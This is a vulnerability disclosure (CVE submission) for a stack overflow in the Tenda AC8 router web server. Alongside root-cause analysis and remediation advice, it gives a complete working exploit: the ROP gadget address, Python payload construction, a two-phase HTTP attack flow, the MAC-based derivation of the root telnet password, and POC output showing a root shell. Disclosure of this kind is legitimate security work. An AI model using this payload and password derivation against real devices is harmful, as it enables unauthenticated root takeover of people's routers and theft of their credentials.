# CVE Submission Report: Tenda AC8 Stack Buffer Overflow in fromSysToolChangePwd (RCE)

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Title** | Stack Buffer Overflow via Unbounded Password Read in `fromSysToolChangePwd` |
| **Vendor** | Shenzhen Tenda Technology Co., Ltd. |
| **Product** | Tenda AC8 V5.0 |
| **Firmware Version** | V16.03.50.11(955) |
| **Affected Component** | `/bin/httpd` (embedded web server) |
| **Affected Function** | `fromSysToolChangePwd` (address: `0x004b6ecc`) |
| **Vulnerability Type** | CWE-121: Stack-based Buffer Overflow |
| **Secondary CWE** | CWE-120: Buffer Copy without Checking Size of Input |
| **CVSS v3.1 Score** | **8.8 (High)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Attack Vector** | Adjacent Network (LAN) |
| **Authentication Required** | None (on factory-reset device) |
| **User Interaction** | None |
| **Impact** | Remote Code Execution as root — full device compromise |

---

## 2. Affected Products

| Product | Firmware Version | Architecture | Status |
|---------|-----------------|--------------|--------|
| Tenda AC8 V5.0 | V16.03.50.11(955)_cn | MIPS32 LE | Confirmed vulnerable |
| Tenda AC8 V5.0 | V16.03.50.11(955)_multi | MIPS32 LE | Confirmed vulnerable |

### Binary Identification

- **File:** `/bin/httpd`
- **SHA256:** `8ace106609bca02860c17d5d251c1286ea21a7760444fbc97066e5c2a99a0a24`
- **Build Path:** `UGWV6.0_11AC_P_AC8V5.0/prod/httpd/11ac/`
- **Type:** ELF 32-bit LSB executable, MIPS, little-endian
- **Base Address:** `0x00400000` (static, no PIE)

### Binary Protections

| Protection | Status |
|-----------|--------|
| NX (No-Execute) | Enabled |
| RELRO | None |
| Stack Canary | **Disabled** |
| PIE | **Disabled** |
| Fortify Source | **Disabled** |
| Stripped | Yes |
| **Protection Score** | **1/5** |

---

## 3. Vulnerability Description

The `fromSysToolChangePwd` function in `/bin/httpd` handles admin password changes via the `/goform/SysToolChangePwd` HTTP endpoint. The function reads the currently stored password from the configuration manager (`cfmd`) into a fixed-size 36-byte stack buffer using `GetValue("sys.userpass", local_2c)`. The `GetValue` function internally uses a 1500-byte intermediate buffer and copies the result to the destination without checking the destination buffer size.

If the stored password exceeds 36 bytes, the `GetValue` call overflows `local_2c`, corrupting the saved frame pointer (`$s8`) and return address (`$ra`) on the stack. Since the binary has no stack canaries and is not position-independent (static base `0x00400000`), an attacker can precisely control `$ra` to redirect execution to an arbitrary address.

The attack is a two-phase exploit:

1. **Phase 1 (Store):** Set the device password to a crafted 43-byte payload containing the ROP chain. On a factory-reset device, no authentication is required because the admin password is empty.
2. **Phase 2 (Trigger):** Make any request to `/goform/SysToolChangePwd`. The function calls `GetValue("sys.userpass", local_2c)`, reading the 43-byte payload into the 36-byte buffer, overflowing `$s8` and `$ra`. When the function returns, execution jumps to the attacker-controlled address.

The confirmed POC achieves remote code execution by redirecting `$ra` to a gadget within the `TendaTelnet` function at `0x004c32dc`, which calls `doSystemCmd("telnetd &")`, starting a root telnet daemon on port 23.

---

## 4. Technical Root Cause

### 4.1 Vulnerable Function — `fromSysToolChangePwd()` (address: 0x004b6ecc)

```c
void fromSysToolChangePwd(int request) {
    char local_2c[36];                         // 36-byte stack buffer

    memset(local_2c, 0, 32);                   // only clears 32 of 36 bytes

    char *old_pwd = websGetVar(request, "SYSOPS", "");
    char *new_pwd = websGetVar(request, "SYSPS", "");
    char *confirm = websGetVar(request, "SYSPS2", "");

    GetValue("sys.userpass", local_2c);        // *** OVERFLOW HERE ***
    // GetValue can write up to 1500 bytes into the 36-byte buffer

    if (strcmp(local_2c, old_pwd) != 0 || strcmp(new_pwd, confirm) != 0) {
        websRedirect(request, "/system_password.html?1");
        return;
    }
    // ... password change logic ...
}
```

### 4.2 Unbounded Copy in GetValue — `libcommon.so` (address: 0x000310a8)

`GetValue` delegates to an internal function that communicates with the `cfmd` configuration daemon over a Unix socket. The response value is received into a 1500-byte buffer (`local_5f4[1500]`), then copied to the caller's destination buffer without any size check:

```c
// Inside GetValue → FUN_00030688 (libcommon.so)
// After receiving response from cfmd:
case 5:  // GET response
    sVar1 = strlen(local_5f4);           // length of stored password (up to 1500)
    strncpy(param_2, local_5f4, sVar1);  // copies sVar1 bytes to caller's buffer
    param_2[sVar1] = '\0';              // null-terminate
    break;
```

The `strncpy` uses the **source length** as the limit, not the destination buffer size. This means up to 1500 bytes can be written into the 36-byte `local_2c` buffer in `fromSysToolChangePwd`.

### 4.3 Stack Layout

```
fromSysToolChangePwd stack frame (88 bytes):

  sp+0x00: [saved registers, locals]
  sp+0x10: [saved $gp]
  sp+0x2c: [local_2c - 36 bytes]  ← GetValue writes here
  sp+0x50: [saved $s8]            ← offset +36 from buffer start
  sp+0x54: [saved $ra]            ← offset +40 from buffer start
  sp+0x58: [caller frame]

Overflow write:
  Bytes  0-35:  Fill local_2c[36]          (padding)
  Bytes 36-39:  Overwrite saved $s8        (0x42424242)
  Bytes 40-42:  Overwrite lower 3 bytes of saved $ra
  Byte  43:     Null terminator → MSB of $ra = 0x00
  Result:       $ra = 0x004c32dc
```

### 4.4 Function Epilogue

```asm
; fromSysToolChangePwd epilogue at 0x4b7328:
  or   sp, s8, zero        ; sp restored from $s8 REGISTER (not memory, unaffected)
  lw   ra, 0x54(sp)        ; ra = overwritten value = 0x004c32dc
  lw   s8, 0x50(sp)        ; s8 = 0x42424242
  addiu sp, sp, 0x58
  jr   ra                  ; JUMP TO ROP GADGET
```

Key detail: `$sp` is restored from the **register** `$s8` (which hasn't been modified since the prologue set `s8 = sp`), not from the overwritten memory location. This means the stack pointer is valid when the ROP gadget executes, even though the saved `$s8` in memory was corrupted.

### 4.5 ROP Gadget — TendaTelnet (address: 0x004c32dc)

The exploit redirects execution to a code sequence inside the `TendaTelnet` function that loads and calls `doSystemCmd("telnetd &")`:

```asm
004c32dc  lw   v0, -0x7850(gp)    ; v0 = rodata pointer from GOT
004c32e0  nop
004c32e4  addiu a0, v0, -0x160    ; a0 = pointer to "telnetd &"
004c32e8  lw   v0, -0x7088(gp)    ; v0 = doSystemCmd() address from GOT
004c32ec  nop
004c32f0  or   t9, v0, zero       ; t9 = doSystemCmd
004c32f4  jalr t9                  ; *** doSystemCmd("telnetd &") ***
004c32f8  nop
004c32fc  lw   gp, 0x10(s8)       ; CRASH (s8=0x42424242, but telnetd already running)
```

This works because:
- `$gp` remains `0x0052e810` (the function epilogue does not modify it)
- All GOT-relative loads resolve correctly using the intact `$gp`
- The gadget only depends on `$gp`, `$v0`, `$a0`, `$t9` — no `$s8`/`$sp` dependency before the call
- `"telnetd &"` is backgrounded, so it survives the post-call crash at `0x004c32fc`
- `0x004c32dc` in little-endian: `DC 32 4C 00` — the MSB `0x00` is provided by the string null terminator

---

## 5. CVSS v3.1 Scoring Breakdown

**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**Score: 8.8 (High)**

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Adjacent (A) | Requires LAN access to the router's web interface |
| Attack Complexity | Low (L) | No ASLR (static binary), no stack canaries, deterministic ROP address |
| Privileges Required | None (N) | Factory-reset device has no password — unauthenticated exploitation. Even on configured devices, web auth is the only barrier (no additional privilege) |
| User Interaction | None (N) | No user action required |
| Scope | Unchanged (U) | Compromise of the router (the vulnerable component) |
| Confidentiality | High (H) | Root shell grants full filesystem read: /etc/shadow, TLS keys, WiFi credentials |
| Integrity | High (H) | Root access allows arbitrary firmware modification, config changes, backdoor installation |
| Availability | High (H) | httpd crashes during exploitation; root access allows device bricking |

**Note:** On factory-reset devices (no admin password set), the entire attack is unauthenticated. On configured devices, the attacker must know the current admin password to complete Phase 1 (storing the overflow payload), though this can be combined with the IPv6 authentication bypass (separate finding) to bypass this requirement entirely.

---

## 6. Exploitation

### 6.1 Prerequisites

- LAN access (same network as the router)
- **Factory-reset device:** No credentials needed (admin password is empty)
- **Configured device:** Current admin password required for Phase 1, OR combine with IPv6 auth bypass

### 6.2 Attack Flow

```
Phase 1: Store Payload                    Phase 2: Trigger Overflow
─────────────────────────                 ──────────────────────────
POST /goform/SysToolChangePwd             POST /login/Auth (with payload as password)
  SYSOPS = ""  (empty, matches default)   → gets session cookie
  SYSPS  = [43-byte ROP payload]          
  SYSPS2 = [43-byte ROP payload]          POST /goform/SysToolChangePwd
                                            → GetValue reads 43 bytes into 36-byte buffer
SetValue("sys.userpass", payload)           → $ra overwritten with 0x004c32dc
  → password stored in cfmd                 → function returns → jr $ra
                                            → doSystemCmd("telnetd &")
                                            → ROOT SHELL ON PORT 23
```

### 6.3 Payload Construction

```python
BUFFER_SIZE = 36
ROP_ADDR = 0x004c32dc  # TendaTelnet → doSystemCmd("telnetd &")

payload = b"A" * 36           # fill local_2c[36]
payload += b"BBBB"            # overwrite saved $s8 (don't care)
payload += pack("<I", ROP_ADDR)[:3]  # lower 3 bytes of $ra
# Null terminator (byte 44) sets MSB of $ra to 0x00
# Result: $ra = 0x004c32dc
# Total: 43 bytes
```

### 6.4 Post-Exploitation

After `telnetd` starts, the root password is derived from the device MAC address using the `cnsl_safe` algorithm:

```
MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64 encode
Special case: MAC 00:90:4c:88:88:88 → password "Fireitup"
```

The MAC is obtained from the ARP table (the attacker already communicated with the router in Phases 1 and 2).

---

## 7. Proof of Concept

A complete POC script (`poc_rce.py`) is provided. It automates the full exploitation chain from password store through ROP to root shell login.

```bash
# Full automated exploit: overflow → ROP → telnet → root shell
python3 poc_rce.py --target http://192.168.0.1
```

**Output (redacted):**
```
========================================================================
  Tenda AC8 — fromSysToolChangePwd Stack Overflow → Root Shell
========================================================================

  Target:         http://192.168.0.1
  Payload size:   43 bytes
  Buffer size:    36 bytes (local_2c)
  $s8 overwrite:  0x42424242 ('BBBB')
  $ra overwrite:  0x004c32dc (TendaTelnet → doSystemCmd())
  ROP effect:     doSystemCmd("telnetd &") → root shell on port 23

[+] httpd is responding.

[*] Step 1: Storing 43-byte overflow password...
[+] Password stored successfully (43 bytes)

[*] Step 2: Logging in with overflow password...
[+] Login successful! Cookie received.

[*] Step 3: Triggering overflow → ROP → doSystemCmd("telnetd &")...
[+] Connection reset — httpd crashed!
[+] Confirmed: httpd is not responding.

[*] Step 4: Verifying telnet access on 192.168.0.1:23...
[+] TELNET IS OPEN on 192.168.0.1:23!

[*] Step 5: Logging into telnet as root...
[+] Found MAC: b8:3a:08:1b:57:50
[+] Derived root password: <redacted>
[+] ROOT SHELL ACTIVE!
    $ cat /etc/shadow
    root:$1$<redacted>:0:0:99999:7:::

========================================================================
  RESULT: ROOT SHELL OBTAINED — FULL DEVICE COMPROMISE
========================================================================
```

The POC requires Python 3 with the `requests` library.

---

## 8. Impact Assessment

### Direct Impact
- **Remote Code Execution as root** — arbitrary command execution via ROP chain
- **Full device compromise** — read/write filesystem, access all credentials
- **httpd crash** — the web server crashes after exploitation (denial of service as side effect); the watchdog timer typically restarts it within 30-60 seconds

### Attack Scenarios
1. **Factory-reset attack** — zero-click exploitation of newly deployed or recently reset routers with no authentication requirement
2. **Chained attack** — combine with IPv6 auth bypass to exploit configured devices without knowing the admin password
3. **Persistent backdoor** — after obtaining root shell, install firmware-level persistence that survives factory reset

### Exploitation Reliability
- **Deterministic** — no ASLR, no canaries, static binary base address `0x00400000`
- **Single attempt** — no brute-forcing required; the ROP address is fixed across all devices running this firmware
- **Self-contained** — the ROP gadget uses only `$gp`-relative addressing, which remains intact after the overflow

---

## 9. Remediation Recommendations

1. **Bounds-check the `GetValue` destination buffer** — pass the destination buffer size to `GetValue` and enforce it in `libcommon.so`'s `FUN_00030688`. The `strncpy` at the copy-out site must use the destination size, not the source length.
2. **Limit the maximum password length** — enforce a maximum length (e.g., 32 bytes) in both `SetValue` (when storing) and `fromSysToolChangePwd` (when receiving via `websGetVar`).
3. **Enable stack canaries** — recompile `/bin/httpd` with `-fstack-protector-all` to detect stack buffer overflows at runtime.
4. **Enable PIE and full RELRO** — compile with `-fPIE -pie -Wl,-z,relro,-z,now` to make ROP exploitation significantly harder.
5. **Require authentication for password changes** — the `/goform/SysToolChangePwd` endpoint should not be accessible without prior authentication, even on factory-reset devices. Implement a separate initial setup flow that cannot be abused for overflow attacks.

---

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-03-04 | Vulnerability discovered during firmware security assessment |
| 2025-03-04 | Exploitation confirmed against live Tenda AC8 V5.0 device |
| 2025-03-04 | POC developed and tested — root shell obtained |
| 2025-03-04 | Vendor notified via email (security@tenda.com.cn, support@tenda.com.cn) |
| 2025-03-04 | CVE requested via VulDB |

---

## 11. References

- **Firmware:** Tenda AC8 V5.0 V16.03.50.11(955)
- **Binary hash:** `/bin/httpd` SHA256: `8ace106609bca02860c17d5d251c1286ea21a7760444fbc97066e5c2a99a0a24`
- **CWE References:**
  - CWE-121: Stack-based Buffer Overflow
  - CWE-120: Buffer Copy without Checking Size of Input
- **Related:** The `GetValue` unbounded copy in `libcommon.so` affects any caller that uses a fixed-size stack buffer as the destination. Other `/goform/` handlers using this pattern may be similarly vulnerable.

---

## 12. Discoverer

Andrew Bellini - @DigitalAndrew - andrew@digitalandrew.io
---

*Analysis performed using Wairz firmware security assessment platform with Ghidra decompilation.*
